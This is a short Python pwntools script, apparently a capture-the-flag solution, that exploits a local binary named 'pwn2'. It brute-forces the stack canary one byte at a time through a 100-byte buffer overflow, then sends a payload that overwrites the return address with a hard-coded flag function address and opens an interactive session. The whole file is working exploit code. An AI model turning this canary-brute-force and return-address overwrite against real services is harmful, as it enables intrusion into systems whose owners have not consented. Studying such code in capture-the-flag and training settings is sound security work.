from pwn import *
name = './pwn2'
p = process(name)
elf = ELF(name)

p.recvuntil('welcome\n')

canary = '\x00'
for i in range(3):
    print(hex(i))
    for j in range(256):
        print(hex(j))
        p.send('a'*100 + canary + chr(j))
        a = p.recvuntil("welcome\n")
        if b"recv" in a:
            canary += chr(j)
            break


canary = u32(canary)
success("canary: " + hex(canary))
getflag = 0x0804863B
payload = b'a'*100 + p32(canary) + b'a'*12 + p32(getflag)
p.sendline(payload)

p.interactive()